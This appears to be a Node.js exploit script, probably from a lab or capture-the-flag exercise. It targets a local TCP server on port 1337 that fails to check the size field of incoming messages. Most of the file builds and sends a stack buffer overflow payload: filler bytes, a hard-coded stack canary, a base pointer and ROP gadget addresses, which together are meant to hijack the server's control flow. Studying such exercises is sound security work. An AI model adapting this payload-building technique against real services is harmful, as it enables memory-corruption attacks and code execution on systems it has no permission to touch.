const net = require("net");

/*

  The server accepts the following message format in bytes:
  
  0    1    2    3         n
  +----+----+----+-- ... --+
  | ps |  payload          |
  +----+----+----+-- ... --+
  
  ps = payload size

  The server doesn't validate incoming ps values. Besides, the 
  buffer which stores the message payload can only hold up to 
  32 bytes.

*/

const evilPayload = merge(
  string("A".repeat(32)), // fill the buffer
  string("B".repeat(8)), // stack alignment
  hexLE("0xea8cf540df1f0038"), // stack canary
  //string("C".repeat(12 + 4)), // stack alignment and socketfd parameter
  string("D".repeat(8)), // stack base pointer
  hexLE("0x103572c61"), // ROP gadget #1
  string("D".repeat(8)), // stack base pointer
  hexLE("0x103572c61"), // ROP gadget #1
);

const evilMessage = merge(byte(evilPayload.length), evilPayload);

const client = new net.Socket();
client.connect(1337, "127.0.0.1", () => {
  console.log(evilMessage);
  client.write(evilMessage);
  client.destroy();
});

// helpers

function merge(...args) {
  return Buffer.concat([...args]);
}

function string(str) {
  return Buffer.from(str);
}

function byte(b) {
  const buffer = Buffer.alloc(1);
  buffer[0] = b;
  return buffer;
}

function hexLE(string) {
  const buffer = Buffer.alloc(8);
  buffer.writeBigUInt64LE(BigInt(string), 0);
  return buffer;
}

function hexBE(string) {
  const buffer = Buffer.alloc(8);
  buffer.writeBigUInt64BE(BigInt(string), 0);
  return buffer;
}